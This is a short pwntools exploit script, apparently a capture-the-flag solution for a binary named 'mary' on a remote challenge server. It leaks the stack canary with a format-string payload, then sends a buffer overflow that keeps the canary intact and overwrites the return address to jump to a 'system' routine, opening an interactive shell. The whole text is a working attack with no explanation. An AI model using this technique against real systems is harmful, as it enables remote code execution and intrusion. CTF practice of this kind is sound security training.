from pwn import *
context.log_level='debug'
#p=process('./mary')
p=remote('111.198.29.45',32567)
sys_addr=0x4008da
p.recvuntil("3. Exit the battle \n")
p.sendline('2')
payload1='%23$p'
p.sendline(payload1)
temp=p.recv(18)
canary=int(temp,16)
print canary
p.recvuntil("3. Exit the battle \n")
p.sendline('1')
payload2='a'*(0x88)+p64(canary)+'a'*0x8+p64(sys_addr)
p.sendline(payload2)
p.interactive()
